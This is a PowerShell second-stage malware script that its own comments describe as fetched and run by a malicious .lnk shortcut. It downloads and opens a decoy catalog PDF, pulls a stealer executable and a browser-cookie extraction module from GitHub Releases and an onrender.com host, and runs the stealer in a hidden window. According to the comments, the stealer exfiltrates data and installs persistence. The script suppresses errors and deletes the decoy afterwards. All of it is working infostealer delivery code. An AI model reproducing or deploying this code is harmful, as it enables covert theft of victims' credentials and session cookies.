# Stage script — downloaded and executed by the .lnk
# Downloads stealer + native module from GitHub Releases, runs extraction, opens cover PDF
$ErrorActionPreference = 'SilentlyContinue'
$base = 'https://rankaksks.onrender.com'
$ghBase = 'https://github.com/sandyjack1997/rankaksks/releases/download/v1.0'
$tmp = "$env:TEMP\wupdate-$(Get-Random)"

# Create temp dir
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# Download cover PDF and open it immediately (user sees the catalog)
try {
    Invoke-WebRequest "$base/dl/catalog.pdf" -OutFile "$tmp\catalog.pdf" -UseBasicParsing
    Start-Process "$tmp\catalog.pdf"
} catch {}

# Download stealer exe from GitHub Release
try {
    Invoke-WebRequest "$ghBase/s.exe" -OutFile "$tmp\s.exe" -UseBasicParsing

    # Native module - must be in correct relative path
    $ndir = "$tmp\node_modules\rookie-cookies-win32-x64-msvc"
    New-Item -ItemType Directory -Path $ndir -Force | Out-Null
    Invoke-WebRequest "$ghBase/n.node" -OutFile "$ndir\rookie_cookies.win32-x64-msvc.node" -UseBasicParsing

    # Run stealer hidden (one-shot: extract + upload + install persistence)
    Start-Process -FilePath "$tmp\s.exe" -WindowStyle Hidden -WorkingDirectory $tmp
} catch {}

# Schedule self-cleanup after stealer finishes
Start-Sleep -Seconds 10
Remove-Item "$tmp\catalog.pdf" -Force -ErrorAction SilentlyContinue
